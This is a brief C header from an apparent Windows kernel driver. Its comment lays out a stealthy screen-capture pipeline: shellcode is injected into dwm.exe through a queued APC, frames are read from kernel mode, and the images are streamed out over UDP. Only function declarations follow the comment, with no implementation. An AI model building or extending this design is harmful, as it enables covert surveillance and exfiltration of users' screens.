//
// ScreenShot.h - Pure-kernel screen capture via GDI shellcode injection
//                into dwm.exe. No user-mode component required.
//
// Pipeline:
//   find dwm.exe -> attach -> resolve GDI APIs from PEB/Ldr/PE exports ->
//   alloc RW buffer + RX shellcode page in dwm -> queue user APC ->
//   shellcode captures screen via BitBlt/GetDIBits -> kernel reads frame
//   via MmCopyVirtualMemory -> streams over WSK UDP (NDARK1 protocol)
//

#pragma once

#include <ntddk.h>

NTSTATUS NetDrvScreenCapture(VOID);
VOID     NetDrvScreenCleanup(VOID);  /* call from DriverUnload */
NTSTATUS NetDrvScreenCapture(VOID);
